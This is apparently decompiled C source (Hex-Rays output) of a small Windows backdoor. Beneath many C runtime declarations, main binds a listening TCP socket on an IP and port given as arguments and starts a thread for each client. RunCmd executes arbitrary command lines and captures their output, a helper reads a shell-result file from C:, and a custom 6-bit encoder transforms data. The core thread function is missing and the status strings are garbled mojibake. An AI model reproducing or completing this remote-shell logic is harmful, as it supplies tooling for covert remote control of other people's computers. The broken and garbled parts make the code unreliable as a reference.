/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007 Hex-Rays sprl <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Data declarations

extern _UNKNOWN _local_unwind2;
extern _UNKNOWN NLG_Notify1;
extern _UNKNOWN NLG_Notify;
extern _UNKNOWN loc_40720C;
extern _UNKNOWN loc_407398;
extern _UNKNOWN loc_40754C;
extern _UNKNOWN loc_4076D8;
extern char aCSm_shell_resu[]; // idb
extern wchar_t aR_0[2]; // weak
extern char aIZ_[15]; // weak
extern char aZMI_[13]; // weak
extern char asc_4095A8[3]; // weak
extern char aKR[7]; // weak
extern char aR[3]; // weak
extern char aSocket[7]; // weak
extern char asc_4095EC; // weak
extern char aIsocketZA[18]; // weak
extern char aWsastartupA[14]; // weak
extern char asc_409628[9]; // weak
extern int (__stdcall *std__bad_alloc___vftable_)(char); // weak
extern char aCmd_exe[8]; // weak
extern char aCommand_com[12]; // weak
extern char aC[3]; // weak
extern char aComspec[8]; // weak
extern int (__stdcall *exception___vftable_)(char); // weak
extern char aUnknownExcepti[18]; // weak
extern int (__stdcall *type_info___vftable_)(char); // weak
extern _UNKNOWN unk_4096D4; // weak
extern char aMicrosoftVisua[37]; // weak
extern char aProgram[10]; // weak
extern char asc_409728[3]; // weak
extern char a___[4]; // weak
extern char aABufferOverrun[160]; // weak
extern char aASecurityError[177]; // weak
extern char ProcName[]; // idb
extern char ModuleName[]; // idb
extern wchar_t asc_409908[2]; // weak
extern char aPath[5]; // weak
extern char a_com[5]; // weak
extern char _lookuptable[]; // idb
extern char aGetprocesswind[]; // idb
extern char aGetuserobjecti[]; // idb
extern char aGetlastactivep[]; // idb
extern char aGetactivewindo[]; // idb
extern char aMessageboxa[]; // idb
extern char LibFileName[]; // idb
extern const WCHAR SrcStr; // idb
extern _UNKNOWN _rtc_izz; // weak
extern _UNKNOWN _rtc_tzz; // weak
extern _UNKNOWN _xc_a; // weak
extern _UNKNOWN _xc_z; // weak
extern _UNKNOWN _xi_a; // weak
extern _UNKNOWN _xi_z; // weak
extern _UNKNOWN _xp_a; // weak
extern _UNKNOWN _xp_z; // weak
extern _UNKNOWN _xt_a; // weak
extern _UNKNOWN _xt_z; // weak
extern int _security_cookie; // weak
extern int (__cdecl *aexit_rtn)(_DWORD); // idb
extern int _app_type; // weak
extern char (*ext_strings)[5]; // weak
extern char (*off_40B0D0)[5]; // weak
extern char (*_nullstring)[7]; // weak
extern wchar_t (*_wnullstring)[7]; // weak
extern void *iob; // weak
extern _UNKNOWN unk_40B0F0; // weak
extern _UNKNOWN unk_40B100; // weak
extern _UNKNOWN unk_40B120; // weak
extern _UNKNOWN unk_40B150; // weak
extern int rterrs[]; // idb
extern struct_2 stru_40B364[4]; // weak
extern _UNKNOWN XcptActTab; // weak
extern int First_FPE_Indx; // weak
extern int Num_FPE; // weak
extern int XcptActTabCount; // weak
extern int fpecode; // weak
extern _UNKNOWN _badioinfo; // weak
extern int errtable[]; // idb
extern int stru_40B4A4[]; // idb
extern int (__cdecl *cfltcvt_tab)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // idb
extern int (__cdecl *off_40B610)(_DWORD); // idb
extern int (__cdecl *off_40B618)(_DWORD); // idb
extern wchar_t (*pctype)[33]; // weak
extern int _mb_cur_max; // idb
extern char _rgctypeflag[]; // idb
extern int _rgcode_page_info; // weak
extern int dword_40B64C[3]; // weak
extern int dword_40B658[]; // idb
extern struct _RTL_CRITICAL_SECTION g_cs; // idb
extern int dword_40B778; // weak
extern int aenvptr; // weak
extern int _error_mode; // weak
extern int (__cdecl *pnhHeap)(_DWORD); // idb
extern int (__cdecl *user_handler)(_DWORD, _DWORD); // idb
extern int errno; // weak
extern int doserrno; // weak
extern int umaskval; // weak
extern int osplatform; // weak
extern int osver; // weak
extern int winmajor; // weak
extern int _argc; // idb
extern char **_argv; // idb
extern LPVOID environ; // idb
extern int _initenv; // weak
extern int wenviron; // weak
extern int pgmptr; // weak
extern char exitflag; // weak
extern int C_Termination_Done; // weak
extern int C_Exit_Done; // weak
extern char stdbuf[8]; // weak
extern int cflush; // weak
extern int (__thiscall *adbgmsg)(_DWORD); // idb
extern int pxcptinfoptrs; // weak
extern char Filename[]; // idb
extern char byte_40B904; // weak
extern int dword_40B908; // weak
extern int newmode; // idb
extern LPTOP_LEVEL_EXCEPTION_FILTER pOldExceptFilter; // idb
extern int (__stdcall *dword_40B914)(_DWORD, _DWORD, _DWORD, _DWORD); // idb
extern int (*dword_40B918)(void); // idb
extern int (__stdcall *dword_40B91C)(_DWORD); // idb
extern int (*dword_40B920)(void); // idb
extern int (__stdcall *dword_40B924)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // idb
extern int nValidPages; // weak
extern int rgValidPages[]; // idb
extern __int32 lModifying; // idb
extern int commode; // weak
extern int dword_40B978; // weak
extern int fSystemSet; // weak
extern int (*_pTerminate)(void); // idb
extern int fmode; // weak
extern int dword_40B98C; // weak
extern LCID Locale; // idb
extern UINT _lc_codepage; // idb
extern int dword_40B9B0; // weak
extern int ctrlc_action; // weak
extern int ctrlbreak_action; // weak
extern int abort_action; // weak
extern int term_action; // weak
extern LCID _mblcid; // idb
extern int _ismbcodepage; // weak
extern _UNKNOWN mbctype; // weak
extern char byte_40B9E1[]; // idb
extern UINT _mbcodepage; // idb
extern struct_1 _mbulinfo; // weak
extern char mbcasemap[]; // idb
extern int _sbh_pHeaderDefer; // weak
extern int _sbh_cntHeaderList; // weak
extern LPVOID _sbh_pHeaderList; // idb
extern int _sbh_threshold; // weak
extern int _sbh_pHeaderScan; // weak
extern int _sbh_sizeHeaderList; // weak
extern int _sbh_indGroupDefer; // weak
extern HANDLE crtheap; // idb
extern int _active_heap; // weak
extern UINT nhandle; // idb
extern int _pioinfo[]; // idb
extern _UNKNOWN unk_40BC44; // weak
extern int _piob; // weak
extern int nstream; // weak
extern int _env_initialized; // weak
extern int _onexitend; // weak
extern LPCVOID _onexitbegin; // idb
extern int _mbctype_initialized; // weak
extern int (__cdecl *FPinit)(_DWORD); // idb
extern int acmdln; // weak

//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __cdecl RunCmd(LPSTR lpCommandLine); // idb
int __stdcall Encode6BitBufA(int a1, int a2, int a3, int a4);
int __cdecl ReadShellResultFile();
DWORD __stdcall ProcessThread(LPVOID); // idb
int __cdecl main(int argc, const char **argv, const char *envp); // idb
_DWORD operator_new__(); // weak
int __cdecl operator_new(DWORD dwBytes); // idb
void __fastcall std__bad_alloc___bad_alloc(int a1);
int __thiscall std__bad_alloc___scalar_deleting_destructor_(int this, char a2);
int __thiscall std__bad_alloc__bad_alloc(int this, int a2);
_DWORD std___Nomemory(); // weak
_DWORD __cdecl strcpy(_DWORD); // weak
int __cdecl strcat(int a1, int a2);
void __cdecl report_failure();
signed int __cdecl sub_401C05();
// void __usercall sub_401C09(int a1<ebp>);
void __fastcall _security_check_cookie(int a1);
signed int __cdecl fclose(int a1);
int __cdecl fgets(int a1, int a2, int a3);
int __cdecl fsopen(char *a1, int a2, int a3); // idb
int __cdecl fopen(char *a1, int a2); // idb
int __cdecl strlen(int a1);
signed int __cdecl system(int a1);
int __cdecl sprintf(int a1, int a2, char a3);
int __cdecl printf(int a1, char a2);
int __thiscall atol(int this, int *a2);
_DWORD atoi(); // weak
int __cdecl amsg_exit(DWORD NumberOfBytesWritten); // idb
void *__cdecl heap_alloc(DWORD dwBytes); // idb
int __cdecl nh_malloc(DWORD dwBytes, int a2); // idb
int __cdecl malloc(DWORD dwBytes); // idb
bool __cdecl callnewh(int a1);
int __thiscall exception__exception(int this, int *a2);
// _DWORD __stdcall exception__exception(_DWORD); weak
void __fastcall exception___exception(int a1);
char *__fastcall exception__what(int a1);
int __thiscall exception___scalar_deleting_destructor_(int this, char a2);
void __fastcall type_info___type_info(int a1);
int __thiscall type_info___scalar_deleting_destructor_(int this, char a2);
_DWORD operator_delete(); // weak
_onexit_t __cdecl onexit(_onexit_t); // idb
int __cdecl atexit(_onexit_t a1); // idb
signed int __cdecl _onexitinit();
void __stdcall CxxThrowException(int a1, int a2);
unsigned __int32 __cdecl _security_init_cookie();
void __cdecl _security_error_handler(signed int a1, int a2);
void __cdecl free(int a1);
int __cdecl close(int); // idb
int __cdecl freebuf(int a1);
signed int __cdecl flush(int a1);
int __cdecl fflush(int a1);
int __cdecl flsall(int a1);
int __cdecl flushall(); // idb
signed int __cdecl filbuf(int a1);
int __cdecl openfile(char *a1, int a2, int a3, int a4); // idb
void __cdecl _crtExitProcess(UINT uExitCode); // idb
int __cdecl cinit(int a1);
int (*__cdecl doexit(UINT uExitCode, int a2, int a3))(void); // idb
int (*__cdecl exit(UINT uExitCode))(void); // idb
void __cdecl exit(int); // idb
int (*__cdecl cexit())(void);
int (*__cdecl c_exit())(void);
int __cdecl getstream();
int __cdecl spawnvpe(int, const char *, const char *const *, const char *const *); // idb
signed int __cdecl comexecmd(int a1, LPCSTR lpApplicationName, int a3, int a4); // idb
int __cdecl spawnve(int, const char *, const char *const *, const char *const *); // idb
int __cdecl access(const char *, int); // idb
int __cdecl getenv(int a1);
signed int __cdecl flsbuf(unsigned __int8 a1, int a2);
// unsigned __int8 __usercall write_char<al>(unsigned __int8 a1<al>, int a2<ecx>, int a3<esi>);
// char __usercall write_multi_char<al>(int a1<eax>, unsigned __int8 a2, int a3, int a4);
// char __usercall write_string<al>(int a1<eax>, unsigned __int8 *a2<ecx>, int a3<edi>, int a4);
int __cdecl output(int a1, int a2, int a3);
signed int __cdecl stbuf(int a1);
signed int __cdecl ftbuf(int a1, int a2);
signed int __cdecl _initstdio();
int __cdecl _endstdio();
int __thiscall ismbcspace(int this, int MultiByteStr);
__int64 __stdcall allmul(__int64 a1, __int64 a2);
int __cdecl NMSG_WRITE(DWORD NumberOfBytesWritten); // idb
int __cdecl FF_MSGBANNER();
LONG __cdecl XcptFilter(int a1, struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
signed int __cdecl setenvp();
// int __usercall parse_cmdline<eax>(int a1<eax>, int a2<ecx>, int a3<esi>, int a4, int a5);
signed int __cdecl setargv();
int __cdecl _crtGetEnvironmentStringsA();
signed int __cdecl ioinit();
void __cdecl RTC_Initialize();
void __cdecl RTC_Terminate(); // idb
signed int __cdecl _heap_select();
signed int __cdecl heap_init(int a1);
int __cdecl _sbh_heap_init(int a1);
LPVOID __cdecl _sbh_find_block(int a1);
int __cdecl _sbh_free_block(int a1, int a2);
char *__cdecl _sbh_alloc_new_region();
signed int __cdecl _sbh_alloc_new_group(int a1);
signed int __cdecl _sbh_resize_block(int a1, int a2, signed int a3);
int __cdecl _sbh_alloc_block(unsigned int a1);
int __cdecl strcmp(int a1, int a2);
int __cdecl realloc(LPVOID lpMem, DWORD dwBytes); // idb
DWORD __cdecl msize(LPCVOID lpMem); // idb
LONG __stdcall _CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *a1); // idb
int __cdecl _CxxSetUnhandledExceptionFilter();
LPTOP_LEVEL_EXCEPTION_FILTER __cdecl _CxxRestoreUnhandledExceptionFilter();
int __cdecl _crtMessageBoxA(int a1, int a2, int a3);
int __cdecl strncpy(int a1, int a2, unsigned int a3);
int __cdecl _global_unwind2(int a1);
int __cdecl loc_4056BC(int); // weak
signed int __cdecl _unwind_handler(int a1, int a2, int a3, int a4);
int __cdecl _abnormal_termination(); // idb
signed int __cdecl ValidateEH3RN(unsigned int a1);
int __cdecl dosmaperr(int a1);
int __cdecl alloc_osfhnd();
signed int __cdecl set_osfhnd(int a1, HANDLE hHandle); // idb
signed int __cdecl free_osfhnd(signed int a1);
signed int __cdecl get_osfhandle(unsigned int a1);
int __cdecl write(int, const void *, unsigned int); // idb
int __cdecl commit(unsigned int a1);
int __cdecl read(int, void *, unsigned int); // idb
int __cdecl getbuf(int a1);
int sopen(const char *, int, int, ...); // idb
int __cdecl getpath(int a1, int a2, int a3);
int __cdecl mbsrchr(int a1, char a2);
int __cdecl mbschr(unsigned __int16 *a1, int a2);
signed int __cdecl dospawn(int a1, LPCSTR lpApplicationName, int a3, LPVOID lpEnvironment); // idb
signed int __cdecl cenvarg(int *a1, int *a2, int *a3, int a4);
int __cdecl mbsnbicoll(LPCSTR lpMultiByteStr, LPCSTR lpString2, int cchCount2);
signed int __cdecl _wtomb_environ();
__int32 __cdecl lseek(int, __int32, int); // idb
int __cdecl isatty(int); // idb
int __cdecl wctomb(LPSTR UsedDefaultChar, const WCHAR WideCharStr); // idb
int __stdcall aulldvrm(unsigned __int64 a1, unsigned int a2, unsigned int a3);
bool __cdecl calloc(int a1, int a2);
int __cdecl fcloseall(); // idb
BOOL __thiscall isctype(int this, signed int CharType, int a3);
BOOL __cdecl _crtGetStringTypeA(DWORD dwInfoType, LPCSTR lpMultiByteStr, int cchSrc, LPWORD lpCharType, UINT CodePage, LCID Locale, int a7); // idb
// signed int __usercall CPtoLCID<eax>(int a1<eax>);
int __cdecl setSBCS();
unsigned int __cdecl setSBUpLow();
signed int __cdecl setmbcp(UINT CodePage); // idb
int __cdecl _initmbctable();
_DWORD __cdecl memcpy(_DWORD, _DWORD, _DWORD); // weak
_DWORD __cdecl memmove(_DWORD, _DWORD, _DWORD); // weak
signed int __cdecl ValidateExecute(FARPROC lpfn); // idb
void __cdecl terminate();
signed __int64 __cdecl lseeki64(int a1, int a2, int a3, DWORD dwMoveMethod); // idb
int __cdecl chsize(int, __int32); // idb
int __cdecl strrchr(int a1, char a2);
// _DWORD __cdecl strchr(_DWORD, char); weak
void *__cdecl memset(void *a1, unsigned __int8 a2, unsigned int a3);
// int __usercall strncnt<eax>(int a1<eax>, int a2);
signed int __cdecl _crtCompareStringA(LCID Locale, DWORD dwCmpFlags, LPCSTR lpMultiByteStr, int cchCount1, LPCSTR lpString2, int cchCount2, UINT CodePage); // idb
// int __usercall findenv<eax>(int a1<edi>, const CHAR *a2);
// const char **__usercall copy_environ<eax>(int a1<ecx>, const char **a2<edi>);
signed int __cdecl _crtsetenv(unsigned __int16 **a1, int a2);
int __cdecl fptrap();
int __cdecl _ansicp(LCID Locale); // idb
int __cdecl _convertcp(UINT CodePage, int a2, LPCSTR lpMultiByteStr, int a4, int a5, int a6); // idb
signed int __cdecl resetstkoflw();
int __cdecl _crtLCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpMultiByteStr, int cchSrc, LPWSTR lpDestStr, int cchMultiByte, UINT CodePage, int a8); // idb
void __cdecl abort();
int __cdecl setmode(int, int); // idb
char *__cdecl strdup(const char *); // idb
unsigned int __fastcall siglookup(int a1, int a2);
signed int __thiscall raise(int this, signed int a2);
// int __stdcall RtlUnwind(_DWORD, _DWORD, _DWORD, _DWORD); weak
void __cdecl _E2(); // idb
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped); idb
// BOOL __stdcall CloseHandle(HANDLE hObject); idb
// BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); idb
// BOOL __stdcall SetStdHandle(DWORD nStdHandle, HANDLE hHandle); idb
// HANDLE __stdcall GetStdHandle(DWORD nStdHandle); idb
// BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize); idb
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); idb
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection); idb
// int __stdcall LCMapStringW(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest); idb
// int __stdcall LCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest); idb
// void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo); idb
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect); idb
// int __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData); idb
// BOOL __stdcall SetEnvironmentVariableA(LPCSTR lpName, LPCSTR lpValue); idb
// int __stdcall CompareStringW(LCID Locale, DWORD dwCmpFlags, LPCWSTR lpString1, int cchCount1, LPCWSTR lpString2, int cchCount2); idb
// int __stdcall CompareStringA(LCID Locale, DWORD dwCmpFlags, LPCSTR lpString1, int cchCount1, LPCSTR lpString2, int cchCount2); idb
// BOOL __stdcall SetEndOfFile(HANDLE hFile); idb
// BOOL __stdcall IsBadCodePtr(FARPROC lpfn); idb
// BOOL __stdcall GetCPInfo(UINT CodePage, LPCPINFO lpCPInfo); idb
// UINT __stdcall GetOEMCP(); idb
// void __stdcall ExitProcess(UINT uExitCode); idb
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName); idb
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes); idb
// void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const DWORD *lpArguments); idb
// BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount); idb
// DWORD __stdcall GetTickCount(); idb
// DWORD __stdcall GetCurrentThreadId(); idb
// DWORD __stdcall GetCurrentProcessId(); idb
// void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime); idb
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize); idb
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem); idb
// DWORD __stdcall GetLastError(); idb
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName); idb
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode); idb
// HANDLE __stdcall GetCurrentProcess(); idb
// DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName); idb
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped); idb
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
// BOOL __stdcall FreeEnvironmentStringsA(LPSTR); idb
// LPSTR __stdcall GetEnvironmentStrings(); idb
// BOOL __stdcall FreeEnvironmentStringsW(LPWSTR); idb
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cchMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar); idb
// LPWSTR __stdcall GetEnvironmentStringsW(); idb
// UINT __stdcall SetHandleCount(UINT uNumber); idb
// DWORD __stdcall GetFileType(HANDLE hFile); idb
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo); idb
// BOOL __stdcall HeapDestroy(HANDLE hHeap); idb
// HANDLE __stdcall HeapCreate(DWORD flOptions, DWORD dwInitialSize, DWORD dwMaximumSize); idb
// BOOL __stdcall VirtualFree(LPVOID lpAddress, DWORD dwSize, DWORD dwFreeType); idb
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, DWORD dwSize, DWORD flAllocationType, DWORD flProtect); idb
// LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, DWORD dwBytes); idb
// DWORD __stdcall HeapSize(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem); idb
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter); idb
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName); idb
// LONG __stdcall InterlockedExchange(LPLONG Target, LONG Value); idb
// DWORD __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, DWORD dwLength); idb
// BOOL __stdcall FlushFileBuffers(HANDLE hFile); idb
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile); idb
// BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode); idb
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds); idb
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod); idb
// BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType); idb
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cchMultiByte, LPWSTR lpWideCharStr, int cchWideChar); idb
// BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int cchSrc, LPWORD lpCharType); idb
// UINT __stdcall GetACP(); idb
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData); idb
// SOCKET __stdcall socket(int af, int type, int protocol); idb
// int __stdcall WSAGetLastError(); idb
// int __stdcall WSACleanup(); idb
// unsigned __int32 __stdcall inet_addr(const char *cp); idb
// u_short __stdcall htons(u_short hostshort); idb
// int __stdcall bind(SOCKET s, const struct sockaddr *name, int namelen); idb
// int __stdcall listen(SOCKET s, int backlog); idb
// int __stdcall closesocket(SOCKET s); idb
// SOCKET __stdcall accept(SOCKET s, struct sockaddr *addr, int *addrlen); idb


//----- (00401000) --------------------------------------------------------
int __cdecl RunCmd(LPSTR lpCommandLine)
{
  int result; // eax@3
  void *v2; // eax@1
  struct _STARTUPINFOA StartupInfo; // [sp+1Ch] [bp-70h]@1
  int v4; // [sp+6Ch] [bp-20h]@1
  HANDLE hFile; // [sp+74h] [bp-18h]@1
  HANDLE hObject; // [sp+68h] [bp-24h]@1
  HANDLE v7; // [sp+64h] [bp-28h]@2
  struct _PROCESS_INFORMATION ProcessInformation; // [sp+Ch] [bp-80h]@2
  BOOL v9; // [sp+60h] [bp-2Ch]@2
  _BYTE Buffer[51200]; // [sp+78h] [bp-14h]@5
  DWORD NumberOfBytesRead; // [sp+70h] [bp-1Ch]@5

  StartupInfo.cb = 68;
  StartupInfo.lpReserved = 0;
  StartupInfo.lpTitle = 0;
  StartupInfo.dwX = 0;
  StartupInfo.dwY = 0;
  StartupInfo.dwXSize = 0;
  StartupInfo.dwYSize = 0;
  StartupInfo.dwXCountChars = 0;
  StartupInfo.dwYCountChars = 0;
  StartupInfo.dwFillAttribute = 0;
  StartupInfo.dwFlags = 1;
  StartupInfo.cbReserved2 = 0;
  StartupInfo.lpReserved2 = 0;
  StartupInfo.hStdInput = 0;
  StartupInfo.hStdOutput = 0;
  StartupInfo.hStdError = 0;
  v2 = (void *)operator_new__();
  v4 = (int)v2;
  memset(v2, 0, 0xC800u);
  StartupInfo.wShowWindow = 0;
  StartupInfo.lpDesktop = 0;
  if ( CreatePipe(&hFile, &hObject, 0, 0)
    && (v7 = GetStdHandle(0xFFFFFFF5u), SetStdHandle(0xFFFFFFF5u, hObject), v9 = CreateProcessA(
                                                                                   0,
                                                                                   lpCommandLine,
                                                                                   0,
                                                                                   0,
                                                                                   0,
                                                                                   0,
                                                                                   0,
                                                                                   0,
                                                                                   &StartupInfo,
                                                                                   &ProcessInformation), SetStdHandle(0xFFFFFFF5u, v7), v9) )
  {
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(hObject);
    while ( ReadFile(hFile, Buffer, 0xC800u, &NumberOfBytesRead, 0) )
    {
      Buffer[NumberOfBytesRead] = 0;
      strcat(v4, (int)Buffer);
    }
    CloseHandle(hFile);
    result = v4;
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (00401142) --------------------------------------------------------
int __stdcall Encode6BitBufA(int a1, int a2, int a3, int a4)
{
  int v4; // eax@1
  char v5; // bl@1
  signed int v6; // edi@1
  int v7; // esi@1
  char v9; // dl@3
  unsigned __int8 v10; // dl@3
  int v11; // ecx@3
  char v12; // dl@3
  signed int v13; // ebx@3
  int v14; // [sp+10h] [bp-4h]@1
  int v15; // [sp+Ch] [bp-8h]@3

  v4 = a2;
  v6 = 0;
  v7 = 0;
  v5 = 0;
  v14 = 0;
  if ( a3 > 0 )
  {
    do
    {
      if ( v7 >= a4 )
        break;
      v15 = v6 + 2;
      v9 = *(_BYTE *)(v14 + a1);
      BYTE3(a2) = *(_BYTE *)(v14 + a1);
      v10 = v9 >> ((_BYTE)v6 + 2);
      v11 = 6 - v6;
      v6 += 2;
      v12 = v5 | v10;
      v13 = SBYTE3(a2) << v11;
      *(_BYTE *)(v7 + v4) = (v12 & 0x3F) + 60;
      v5 = (v13 >> 2) & 0x3F;
      if ( v6 >= 6 )
      {
        if ( v7 < a4 - 1 )
        {
          ++v7;
          *(_BYTE *)(v7 + v4) = v5 + 60;
        }
        ++v7;
        v6 = 0;
        v5 = 0;
      }
      else
      {
        ++v7;
      }
      ++v14;
    }
    while ( v14 < a3 );
    if ( v6 > 0 )
      *(_BYTE *)(v7++ + v4) = v5 + 60;
  }
  *(_BYTE *)(v7 + v4) = 0;
  return v7;
}

//----- (004011D5) --------------------------------------------------------
int __cdecl ReadShellResultFile()
{
  int v0; // ebx@1
  int v1; // esi@1
  char v3; // [sp+10h] [bp-404h]@2

  v0 = operator_new__();
  memset((void *)v0, 0, 0xC800u);
  v1 = fopen("c:\\sm_shell_result.txt", (int)L"r");
  while ( !(*(_BYTE *)(v1 + 12) & 0x10) )
  {
    fgets((int)&v3, 1024, v1);
    strcat(v0, (int)&v3);
  }
  fclose(v1);
  return v0;
}

//----- (00401254) --------------------------------------------------------
#error "FFFFFFFF: stack frame is too big (funcsize=0)"

//----- (004018B6) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char *envp)
{
  char bl0; // bl@0
  char di0; // di@0
  char ST20_1_0; // ST20_1@0
  signed int v6; // eax@1
  const char **v7; // esi@1
  int result; // eax@4
  const char *v9; // ebx@5
  char v10; // ST1C_1@5
  SOCKET v11; // edi@7
  char v12; // ST18_1@7
  int v13; // ST14_4@12
  char v14; // ST18_1@16
  void *v15; // esi@17
  void *v16; // esi@18
  SOCKET v17; // eax@7
  char v18; // al@8
  u_short v19; // ax@11
  SOCKET v20; // eax@17
  HANDLE v21; // eax@18
  struct WSAData WSAData; // [sp+10h] [bp-1A4h]@5
  struct sockaddr name; // [sp+1A0h] [bp-14h]@11

  v7 = argv;
  v6 = 0;
  if ( !*argv )
    goto LABEL_23;
  do
    ++v6;
  while ( argv[v6] );
  if ( v6 >= 3 )
  {
    v10 = bl0;
    InitializeCriticalSection(&g_cs);
    v9 = *(v7 + 1);
    if ( WSAStartup(0x202u, &WSAData) )
      printf((int)"WSAStartup ¥ÌŒ", v10);
    v12 = di0;
    v17 = socket(2, 1, 6);
    v11 = v17;
    if ( v17 == -1 )
    {
      v18 = WSAGetLastError();
      printf((int)"¥¥Ω®SOCKET ß∞‹,¥ÌŒ", v18);
      WSACleanup();
    }
    else
    {
      name.sa_family = 2;
      *(_DWORD *)&name.sa_data[2] = inet_addr(v9);
      v19 = atoi();
      *(_WORD *)&name.sa_data[0] = htons(v19);
      if ( bind(v11, &name, 16) == -1 )
      {
        v13 = (int)&"∞";
      }
      else
      {
        printf((int)"SOCKET∞", v12);
        if ( listen(v11, 20) != -1 )
        {
          printf((int)"ø™ ºº‡Ã", v12);
          printf((int)"µ»¥", v14);
          while ( 1 )
          {
            do
            {
              v20 = accept(v11, 0, 0);
              v15 = (void *)v20;
            }
            while ( v20 == -1 );
            printf((int)"øÕªß∂À¡¨»Î.\n", v14);
            v21 = CreateThread(0, 0, ProcessThread, v15, 0, (DWORD *)&argv);
            v16 = v21;
            if ( !v21 )
              printf((int)"œﬂ≥Ã¥¥Ω® ß∞‹.\n", v14);
            CloseHandle(v16);
          }
        }
        v13 = (int)"º‡Ã";
      }
      printf(v13, v12);
      closesocket(v11);
    }
    result = 0;
  }
  else
  {
LABEL_23:
    printf((int)"‘À––±æ≥Ã–", ST20_1_0);
    result = -1;
  }
  return result;
}

//----- (00401A2C) --------------------------------------------------------
int __cdecl operator_new(DWORD dwBytes)
{
  DWORD v1; // esi@1
  int result; // eax@4

  v1 = dwBytes;
  while ( 1 )
  {
    result = malloc(v1);
    if ( result )
      break;
    if ( !callnewh(v1) )
      std___Nomemory();
  }
  return result;
}

//----- (00401A50) --------------------------------------------------------
void __fastcall std__bad_alloc___bad_alloc(int a1)
{
  *(_DWORD *)a1 = &std__bad_alloc___vftable_;
  exception___exception(a1);
}

//----- (00401A5B) --------------------------------------------------------
int __thiscall std__bad_alloc___scalar_deleting_destructor_(int this, char a2)
{
  int v2; // esi@1

  v2 = this;
  std__bad_alloc___bad_alloc(this);
  if ( a2 & 1 )
    operator_delete();
  return v2;
}

